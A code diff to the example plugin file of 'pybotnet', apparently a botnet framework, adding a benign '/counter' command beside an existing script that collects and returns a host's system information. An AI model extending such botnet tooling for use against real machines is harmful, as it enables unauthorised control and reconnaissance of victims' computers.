@@ -1,4 +1,4 @@
-from pybotnet import ExternalScripts, Context
+from pybotnet import ExternalScripts, Context, simple_serializer, UserException
 
 # example external scripts
 
@@ -23,6 +23,32 @@ def get_system_info(context: Context):
     for key, value in context.system_info().items():
         sys_data += f"{key}: {value}\n"
     return sys_data
+
+
+@external_botnet.add_script()
+def counter(context: Context):
+    """
+    count numbers
+    syntax:
+        `/counter [number]`
+    example:
+        `/counter 10`
+    """
+
+    # serializer user input
+    command, error = simple_serializer(context.command, [int])
+    if error:
+        raise UserException(error)
+
+    new_number = command[0]
+
+    counter = context.get_global_value("counter")
+    if counter:
+        new_counter = counter + new_number
+        context.set_global_value("counter", new_counter)
+        return new_counter
+    context.set_global_value("counter", new_number)
+    return new_number
 
 
 # step (3)
